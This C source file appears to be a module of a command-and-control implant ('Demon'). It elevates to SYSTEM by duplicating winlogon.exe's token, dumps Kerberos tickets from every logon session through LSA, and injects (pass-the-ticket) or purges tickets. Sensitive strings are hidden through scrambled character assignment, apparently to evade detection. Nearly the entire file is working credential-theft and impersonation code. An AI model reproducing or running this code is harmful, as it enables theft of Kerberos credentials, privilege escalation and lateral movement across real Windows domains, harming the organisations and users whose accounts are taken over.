
#include <Demon.h>
#include <Core/Kerberos.h>
#include <Core/Win32.h>
#include <Core/MiniStd.h>
#include <Core/Token.h>

BOOL IsHighIntegrity(HANDLE TokenHandle)
{
    BOOL                     Success             = FALSE;
    BOOL                     ReturnValue         = TRUE;
    SID_IDENTIFIER_AUTHORITY NtAuthority         = SECURITY_NT_AUTHORITY;
    PSID                     AdministratorsGroup = NULL;

    Success = Instance.Win32.AllocateAndInitializeSid( &NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup );
    if ( Success )
    {
        if ( ! Instance.Win32.CheckTokenMembership( NULL, AdministratorsGroup, &ReturnValue ) )
        {
            ReturnValue = FALSE;
        }
        Instance.Win32.FreeSid( AdministratorsGroup );
        AdministratorsGroup = NULL;
    }

    return Success && ReturnValue;
}

DWORD GetProcessIdByName(WCHAR* processName)
{
    HANDLE          hProcessSnap = NULL;
    PROCESSENTRY32W pe32         = { 0 };
    DWORD           Pid          = -1;

    hProcessSnap = Instance.Win32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if ( hProcessSnap == INVALID_HANDLE_VALUE )
    {
        return Pid;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if ( ! Instance.Win32.Process32FirstW( hProcessSnap, &pe32 ) )
    {
        SysNtClose( hProcessSnap );
        return Pid;
    }

    do {
        if ( StringCompareW( pe32.szExeFile, processName ) == 0 )
        {
            Pid = pe32.th32ProcessID;
            break;
        }

    } while (Instance.Win32.Process32NextW(hProcessSnap, &pe32));

    SysNtClose( hProcessSnap );
    return Pid;
}

BOOL ElevateToSystem()
{
    NTSTATUS          NtStatus       = 0;
    OBJECT_ATTRIBUTES ObjAttr        = { sizeof( ObjAttr ) };
    WCHAR             winlogon[ 13 ] = { 0 };
    HANDLE            hProcess       = NULL;
    BOOL              ReturnValue    = FALSE;
    HANDLE            hDupToken      = FALSE;
    HANDLE            hToken         = FALSE;
    DWORD             ProcessID      = 0;

    winlogon[ 11 ] = HideChar('e');
    winlogon[ 4 ]  = HideChar('o');
    winlogon[ 2 ]  = HideChar('n');
    winlogon[ 6 ]  = HideChar('o');
    winlogon[ 7 ]  = HideChar('n');
    winlogon[ 5 ]  = HideChar('g');
    winlogon[ 12 ] = HideChar(0);
    winlogon[ 3 ]  = HideChar('l');
    winlogon[ 9 ]  = HideChar('e');
    winlogon[ 8 ]  = HideChar('.');
    winlogon[ 1 ]  = HideChar('i');
    winlogon[ 0 ]  = HideChar('w');
    winlogon[ 10 ] = HideChar('x');
    ProcessID = GetProcessIdByName(winlogon);
    MemZero( winlogon, sizeof( winlogon ) );
    if (ProcessID == -1)
    {
        PUTS( "Failed to find the PID of Winlogon.exe" )
        return FALSE;
    }

    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_LIMITED_INFORMATION );
    if ( hProcess )
    {
        if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken ) ) )
        {
            if ( TokenDuplicate(
                hToken,
                TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                SecurityImpersonation | SecurityIdentification, TokenPrimary,
                &hDupToken
            ) ) {
                if ( SysImpersonateLoggedOnUser( hDupToken ) )
                {
                    ReturnValue = TRUE;
                }
                SysNtClose( hDupToken );
            }
            else
            {
                PRINTF( "TokenDuplicate: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
            }
            SysNtClose( hToken );
        }
        else
        {
            PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        }

        SysNtClose( hProcess );
    }
    else
    {
        PRINTF( "NtOpenProcessToken: Failed [%d]\n", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
    }

    return ReturnValue;
}

BOOL IsSystem( HANDLE TokenHandle )
{
    HANDLE                   hToken     = NULL;
    UCHAR                    bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER              pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG                    cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT      = SECURITY_NT_AUTHORITY;
    PSID                     pSystemSid = NULL;
    BOOL                     bSystem    = FALSE;

    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser ) )
    {
        return FALSE;
    }

    if ( ! Instance.Win32.AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid) )
        return FALSE;

    bSystem = Instance.Win32.EqualSid( pTokenUser->User.Sid, pSystemSid );
    Instance.Win32.FreeSid( pSystemSid );

    return bSystem;
}

NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
{
    HANDLE               hLsaLocal = NULL;
    LSA_OPERATIONAL_MODE mode      = 0;
    NTSTATUS             status    = STATUS_SUCCESS;

    if ( ! highIntegrity )
    {
        status = Instance.Win32.LsaConnectUntrusted( &hLsaLocal );
        if ( ! NT_SUCCESS( status ) )
        {
            status = Instance.Win32.LsaNtStatusToWinError( status );
        }
    }
    else
    {
        // AuditPol.exe /set /subcategory:"Security System Extension"
        // /success:enable /failure:enable Event ID 4611 Note: detect elevation via
        CHAR name[10] = { 0 }; // Winlogon
        name[ 2 ] =  HideChar('n');
        name[ 8 ] =  HideChar('n');
        name[ 4 ] =  HideChar('o');
        name[ 0 ] =  HideChar('W');
        name[ 1 ] =  HideChar('i');
        name[ 7 ] =  HideChar('o');
        name[ 6 ] =  HideChar('g');
        name[ 3 ] =  HideChar('l');
        name[ 9 ] =  HideChar('\0');
        name[ 5 ] =  HideChar('o');
        STRING lsaString = (STRING){.Length = 8, .MaximumLength = 9, .Buffer = name};
        status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
        if ( ! NT_SUCCESS( status ) || ! hLsaLocal )
        {
            if ( IsSystem( hToken ) )
            {
                status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                if ( ! NT_SUCCESS( status ) )
                {
                    status = Instance.Win32.LsaNtStatusToWinError( status );
                }
            }
            else
            {
                if ( ElevateToSystem() )
                {
                    status = Instance.Win32.LsaRegisterLogonProcess( (PLSA_STRING)&lsaString, &hLsaLocal, &mode );
                    if ( ! NT_SUCCESS( status ) ) {
                        status = Instance.Win32.LsaNtStatusToWinError( status );
                    }
                    TokenRevSelf();
                }
                else
                {
                    status = NtGetLastError();
                }
            }
        }
        MemZero( name, sizeof( name ) );
    }
    *hLsa = hLsaLocal;
    return status;
}

NTSTATUS GetLogonSessionData( LUID luid, PLOGON_SESSION_DATA* data )
{
    PLOGON_SESSION_DATA          sessionData = NULL;
    PSECURITY_LOGON_SESSION_DATA logonData   = NULL;
    NTSTATUS                     status      = STATUS_UNSUCCESSFUL;

    sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof( LOGON_SESSION_DATA ) );
    if ( ! sessionData )
        return status;

    if ( luid.LowPart != 0 )
    {
        status = Instance.Win32.LsaGetLogonSessionData( &luid, &logonData );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, sizeof(*sessionData->sessionData) );
            if ( sessionData->sessionData != NULL )
            {
                sessionData->sessionCount = 1;
                sessionData->sessionData[0] = logonData;
                *data = sessionData;
            }
            else
            {
                status = STATUS_MEMORY_NOT_ALLOCATED;
            }
        }
    }
    else
    {
        ULONG logonSessionCount;
        PLUID logonSessionList;
        status = Instance.Win32.LsaEnumerateLogonSessions( &logonSessionCount, &logonSessionList );
        if ( NT_SUCCESS( status ) )
        {
            sessionData->sessionData = Instance.Win32.LocalAlloc( LPTR, logonSessionCount * sizeof(*sessionData->sessionData) );
            if ( sessionData->sessionData != NULL )
            {
                sessionData->sessionCount = logonSessionCount;
                for ( int i = 0; i < logonSessionCount; i++ )
                {
                    LUID luid2 = logonSessionList[i];
                    status = Instance.Win32.LsaGetLogonSessionData( &luid2, &logonData );
                    if ( NT_SUCCESS(status) )
                    {
                        sessionData->sessionData[i] = logonData;
                    }
                    else
                    {
                        sessionData->sessionData[i] = NULL;
                    }
                }
                Instance.Win32.LsaFreeReturnBuffer( logonSessionList );
                *data = sessionData;
            }
            else
            {
                status = STATUS_MEMORY_NOT_ALLOCATED;
            }
        }
    }

    return status;
}

VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PUINT32 ticketSize )
{
    PKERB_RETRIEVE_TKT_REQUEST  retrieveRequest  = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE retrieveResponse = NULL;
    ULONG                       responseSize     = sizeof( KERB_RETRIEVE_TKT_REQUEST ) + targetName.MaximumLength;
    NTSTATUS                    status           = STATUS_UNSUCCESSFUL;
    NTSTATUS                    protocolStatus   = STATUS_UNSUCCESSFUL;
    ULONG                       TicketSize       = 0;
    PBYTE                       Ticket           = NULL;

    retrieveRequest = Instance.Win32.LocalAlloc( LPTR, responseSize * sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
    if ( ! retrieveRequest )
        return;

    //retrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
    retrieveRequest->MessageType = 8;
    retrieveRequest->LogonId = luid;
    retrieveRequest->TicketFlags = 0;
    retrieveRequest->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    retrieveRequest->EncryptionType = 0;
    retrieveRequest->TargetName = targetName;
    retrieveRequest->TargetName.Buffer = ( PWSTR )( (PBYTE )retrieveRequest + sizeof( KERB_RETRIEVE_TKT_REQUEST ));
    MemCopy( retrieveRequest->TargetName.Buffer, targetName.Buffer, targetName.MaximumLength );

    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, retrieveRequest, responseSize, (LPVOID*)&retrieveResponse, &responseSize, &protocolStatus );
    if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
    {
        if ( NT_SUCCESS( protocolStatus ) )
        {
            TicketSize = retrieveResponse->Ticket.EncodedTicketSize;
            Ticket = Instance.Win32.LocalAlloc( LPTR, TicketSize );
            if ( Ticket )
            {
                MemCopy( Ticket, retrieveResponse->Ticket.EncodedTicket, TicketSize );
                *ticket     = Ticket;
                *ticketSize = TicketSize;
            }
        }
        else
        {
            PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
        }
    }
    else
    {
        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
    }

    if ( retrieveResponse )
        Instance.Win32.LsaFreeReturnBuffer( retrieveResponse );
    if ( retrieveRequest )
        Instance.Win32.LocalFree( retrieveRequest );
}

VOID CopySessionInfo( PSESSION_INFORMATION Session, PSECURITY_LOGON_SESSION_DATA Data )
{
    // UserName
    StringCopyW( Session->UserName, Data->UserName.Buffer );
    // Domain
    StringCopyW( Session->Domain, Data->LogonDomain.Buffer );
    // LogonId
    Session->LogonId.LowPart  = Data->LogonId.LowPart;
    Session->LogonId.HighPart = Data->LogonId.HighPart;
    // Session
    Session->Session = Data->Session;
    // UserSID
    WCHAR* sid = NULL;
    if ( Instance.Win32.ConvertSidToStringSidW(Data->Sid, &sid) )
    {
        StringCopyW( Session->UserSID, sid );
        Instance.Win32.LocalFree( sid ); sid = NULL;
    }
    // LogonTime
    Session->LogonTime.QuadPart = Data->LogonTime.QuadPart;
    // LogonType
    Session->LogonType = Data->LogonType;
    // AuthenticationPackage
    StringCopyW( Session->AuthenticationPackage, Data->AuthenticationPackage.Buffer );
    // LogonServer
    StringCopyW( Session->LogonServer, Data->LogonServer.Buffer );
    // LogonServerDNSDomain
    StringCopyW( Session->LogonServerDNSDomain, Data->DnsDomainName.Buffer );
    // Upn
    StringCopyW( Session->Upn, Data->Upn.Buffer );
    // Tickets
    Session->Tickets = NULL;
}

VOID CopyTicketInfo( PTICKET_INFORMATION TicketInfo, PKERB_TICKET_CACHE_INFO_EX Data )
{
    // ClientName
    StringCopyW( TicketInfo->ClientName, Data->ClientName.Buffer );
    // ClientRealm
    StringCopyW( TicketInfo->ClientRealm, Data->ClientRealm.Buffer );
    // ServerName
    StringCopyW( TicketInfo->ServerName, Data->ServerName.Buffer );
    // ServerRealm
    StringCopyW( TicketInfo->ServerRealm, Data->ServerRealm.Buffer );
    // StartTime
    TicketInfo->StartTime.LowPart  = Data->StartTime.LowPart;
    TicketInfo->StartTime.HighPart = Data->StartTime.HighPart;
    // EndTime
    TicketInfo->EndTime.LowPart  = Data->EndTime.LowPart;
    TicketInfo->EndTime.HighPart = Data->EndTime.HighPart;
    // RenewTime
    TicketInfo->RenewTime.LowPart  = Data->RenewTime.LowPart;
    TicketInfo->RenewTime.HighPart = Data->RenewTime.HighPart;
    // EncryptionType
    TicketInfo->EncryptionType = Data->EncryptionType;
    // TicketFlags
    TicketInfo->TicketFlags = Data->TicketFlags;
    // Ticket
    TicketInfo->Ticket.Buffer = NULL;
    TicketInfo->Ticket.Length = 0;
}

BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
{
    BOOL                     ReturnValue    = FALSE;
    BOOL                     highIntegrity  = FALSE;
    HANDLE                   hLsa           = NULL;
    LSA_STRING               krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
    NTSTATUS                 status         = STATUS_UNSUCCESSFUL;
    NTSTATUS                 protocolStatus = STATUS_UNSUCCESSFUL;
    ULONG                    authPackage    = 0;
    PKERB_SUBMIT_TKT_REQUEST submitRequest  = NULL;
    DWORD                    submitSize     = sizeof( KERB_SUBMIT_TKT_REQUEST ) + TicketSize;
    PVOID                    response       = NULL;
    ULONG                    responseSize   = 0;
    CHAR                     name[9]        = { 0 };

    name[ 5 ] = HideChar('r');
    name[ 0 ] = HideChar('k');
    name[ 8 ] = HideChar( 0);
    name[ 1 ] = HideChar('e');
    name[ 2 ] = HideChar('r');
    name[ 7 ] = HideChar('s');
    name[ 3 ] = HideChar('b');
    name[ 6 ] = HideChar('o');
    name[ 4 ] = HideChar('e');

    krbAuth.Buffer = name;

    if ( ! hToken )
        goto END;

    highIntegrity = IsHighIntegrity( hToken );
    if ( ! highIntegrity )
    {
        PUTS( "[!] Not in high integrity." );
        goto END;
    }

    status = GetLsaHandle( hToken, highIntegrity, &hLsa );
    if ( ! NT_SUCCESS( status ) || ! hLsa )
    {
        PRINTF( "[!] GetLsaHandle %ld\n", status );
        goto END;
    }

    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
        goto END;
    }

    submitRequest = Instance.Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
    if ( ! submitRequest )
        goto END;

    submitRequest->MessageType    = _KerbSubmitTicketMessage;
    submitRequest->KerbCredSize   = TicketSize;
    submitRequest->KerbCredOffset = sizeof( KERB_SUBMIT_TKT_REQUEST );

    if ( highIntegrity )
    {
        submitRequest->LogonId = luid;
    }

    MemCopy( RVA( PBYTE, submitRequest, submitRequest->KerbCredOffset ), Ticket, TicketSize );

    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus );

    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
        goto END;
    }

    if ( ! NT_SUCCESS( protocolStatus ) )
    {
        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
        goto END;
    }


    ReturnValue = TRUE;

END:
    if ( submitRequest ) {
        Instance.Win32.LocalFree( submitRequest );
    }
    if ( hLsa ) {
        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
    }
    MemZero( name, sizeof( name ) );

    return ReturnValue;
}

BOOL Purge( HANDLE hToken, LUID luid )
{
    BOOL                         ReturnValue    = FALSE;
    BOOL                         highIntegrity  = FALSE;
    HANDLE                       hLsa           = NULL;
    LSA_STRING                   krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
    NTSTATUS                     status         = STATUS_UNSUCCESSFUL;
    NTSTATUS                     protocolStatus = STATUS_UNSUCCESSFUL;
    KERB_PURGE_TKT_CACHE_REQUEST purgeRequest   = { 0 };
    ULONG                        authPackage    = 0;
    PVOID                        purgeResponse  = NULL;
    ULONG                        responseSize   = 0;
    CHAR                         name[9]        = { 0 };

    name[ 5 ] = HideChar('r');
    name[ 0 ] = HideChar('k');
    name[ 8 ] = HideChar( 0);
    name[ 1 ] = HideChar('e');
    name[ 2 ] = HideChar('r');
    name[ 7 ] = HideChar('s');
    name[ 3 ] = HideChar('b');
    name[ 6 ] = HideChar('o');
    name[ 4 ] = HideChar('e');

    krbAuth.Buffer = name;

    if ( ! hToken )
        goto END;

    highIntegrity = IsHighIntegrity( hToken );
    if ( ! highIntegrity )
    {
        PUTS( "[!] Not in high integrity." );
        goto END;
    }

    status = GetLsaHandle( hToken, highIntegrity, &hLsa );
    if ( ! NT_SUCCESS( status ) || ! hLsa )
    {
        PRINTF( "[!] GetLsaHandle %ld\n", status );
        goto END;
    }

    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
        goto END;
    }

    //purgeRequest.MessageType = KerbPurgeTicketCacheMessage;
    purgeRequest.MessageType = 6;

    if ( highIntegrity )
        purgeRequest.LogonId = luid;
    else
        purgeRequest.LogonId = (LUID){.HighPart = 0, .LowPart = 0};

    purgeRequest.RealmName = (UNICODE_STRING){.Buffer = L"", .Length = 0, .MaximumLength = 1};
    purgeRequest.ServerName = (UNICODE_STRING){.Buffer = L"", .Length = 0, .MaximumLength = 1};

    status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &purgeRequest, sizeof(KERB_PURGE_TKT_CACHE_REQUEST), &purgeResponse, &responseSize, &protocolStatus );

    if ( purgeResponse )
    {
        Instance.Win32.LsaFreeReturnBuffer( purgeResponse ); purgeResponse = NULL;
    }

    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
        goto END;
    }

    if ( ! NT_SUCCESS( protocolStatus ) )
    {
        PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
        goto END;
    }

    ReturnValue = TRUE;

END:
    if (hLsa) {
        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
    }
    MemZero( name, sizeof( name ) );

    return ReturnValue;
}

PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
{
    BOOL                              ReturnValue    = FALSE;
    BOOL                              highIntegrity  = FALSE;
    HANDLE                            hLsa           = NULL;
    ULONG                             authPackage    = 0;
    LSA_STRING                        krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
    PLOGON_SESSION_DATA               sessionData    = NULL;
    KERB_QUERY_TKT_CACHE_REQUEST      cacheRequest   = { 0 };
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE cacheResponse  = NULL;
    ULONG                             responseSize   = 0;
    NTSTATUS                          protocolStatus = STATUS_SUCCESS;
    NTSTATUS                          status         = STATUS_SUCCESS;
    PSESSION_INFORMATION              Sessions       = NULL;
    PSESSION_INFORMATION              NewSession     = NULL;
    PSESSION_INFORMATION              TmpSession     = NULL;
    PTICKET_INFORMATION               TicketInfo     = NULL;
    PTICKET_INFORMATION               TmpTicketInfo  = NULL;
    CHAR                              name[9]        = { 0 };

    name[ 5 ] = HideChar('r');
    name[ 0 ] = HideChar('k');
    name[ 8 ] = HideChar( 0);
    name[ 1 ] = HideChar('e');
    name[ 2 ] = HideChar('r');
    name[ 7 ] = HideChar('s');
    name[ 3 ] = HideChar('b');
    name[ 6 ] = HideChar('o');
    name[ 4 ] = HideChar('e');

    krbAuth.Buffer = name;

    if ( ! hToken )
        goto END;

    highIntegrity = IsHighIntegrity( hToken );
    if ( ! highIntegrity )
    {
        PUTS( "[!] Not in high integrity." );
        goto END;
    }

    status = GetLsaHandle( hToken, highIntegrity, &hLsa );
    if ( ! NT_SUCCESS( status ) || ! hLsa )
    {
        PRINTF( "[!] GetLsaHandle %ld\n", status );
        goto END;
    }

    status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
    if ( ! NT_SUCCESS( status ) )
    {
        PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
        goto END;
    }

    status = GetLogonSessionData( luid, &sessionData );
    if ( ! NT_SUCCESS( status ) || ! sessionData )
    {
        PRINTF( "[!] GetLogonSessionData: %lx", status );
        goto END;
    }

    //cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
    cacheRequest.MessageType = 14;
    for ( int i = 0; i < sessionData->sessionCount; i++ )
    {
        if ( sessionData->sessionData[i] == NULL )
            continue;

        NewSession = Instance.Win32.LocalAlloc( LPTR, sizeof( SESSION_INFORMATION ) );
        if ( ! NewSession )
            continue;

        CopySessionInfo( NewSession, sessionData->sessionData[i] );

        if ( ! Sessions )
        {
            NewSession->Next = NULL;
            Sessions = NewSession;
        }
        else
        {
            TmpSession = Sessions;
            while ( TmpSession->Next )
                TmpSession = TmpSession->Next;

            TmpSession->Next = NewSession;
        }

        if ( highIntegrity )
            cacheRequest.LogonId = sessionData->sessionData[i]->LogonId;
        else
            cacheRequest.LogonId = ( LUID ){.HighPart = 0, .LowPart = 0};

        Instance.Win32.LsaFreeReturnBuffer( sessionData->sessionData[i] );

        cacheResponse = NULL;
        status = Instance.Win32.LsaCallAuthenticationPackage( hLsa, authPackage, &cacheRequest, sizeof( cacheRequest ), (LPVOID*)&cacheResponse, &responseSize, &protocolStatus );
        if ( ! NT_SUCCESS( status ) )
        {
            PRINTF( "[!] LsaCallAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
            continue;
        }

        if ( protocolStatus == STATUS_NO_SUCH_LOGON_SESSION )
            continue;

        if ( ! NT_SUCCESS( protocolStatus ) )
        {
            PRINTF( "[!] LsaCallAuthenticationPackage %lx\n", protocolStatus );
            continue;
        }

        if ( ! cacheResponse )
            continue;

        for ( int j = 0; j < cacheResponse->CountOfTickets; j++ )
        {
            TicketInfo = Instance.Win32.LocalAlloc( LPTR, sizeof( TICKET_INFORMATION ) );
            if ( ! TicketInfo )
                continue;

            CopyTicketInfo( TicketInfo, &cacheResponse->Tickets[j] );

            ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheResponse->Tickets[j].ServerName, (PUCHAR*)&TicketInfo->Ticket.Buffer, &TicketInfo->Ticket.Length);

            if ( ! NewSession->Tickets )
            {
                NewSession->Tickets = TicketInfo;
                TicketInfo->Next    = NULL;
            }
            else
            {
                TmpTicketInfo = NewSession->Tickets;
                while ( TmpTicketInfo->Next )
                    TmpTicketInfo = TmpTicketInfo->Next;

                TmpTicketInfo->Next = TicketInfo;
                TicketInfo->Next    = NULL;
            }
        }

        Instance.Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
    }

    ReturnValue = TRUE;

END:
    if ( sessionData && sessionData->sessionData ) {
        Instance.Win32.LocalFree( sessionData->sessionData );
    }
    if ( sessionData ) {
        Instance.Win32.LocalFree( sessionData );
    }
    if ( hLsa ) {
        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
    }
    MemZero( name, sizeof( name ) );

    if ( ReturnValue && Sessions ) {
        return Sessions;
    } else {
        return NULL;
    }
}

LUID* GetLUID( HANDLE hToken )
{
    TOKEN_STATISTICS tokenStats = { 0 };
    DWORD            tokenSize  = 0;
    LUID*            luid       = NULL;

    if ( ! hToken )
        return NULL;

    if ( ! Instance.Win32.GetTokenInformation( hToken, TokenStatistics, &tokenStats, sizeof( tokenStats ), &tokenSize ) )
        return NULL;

    luid = Instance.Win32.LocalAlloc( LPTR, sizeof( LUID ) );
    if ( ! luid )
        return NULL;

    luid->HighPart = tokenStats.AuthenticationId.HighPart;
    luid->LowPart  = tokenStats.AuthenticationId.LowPart;

    return luid;
}
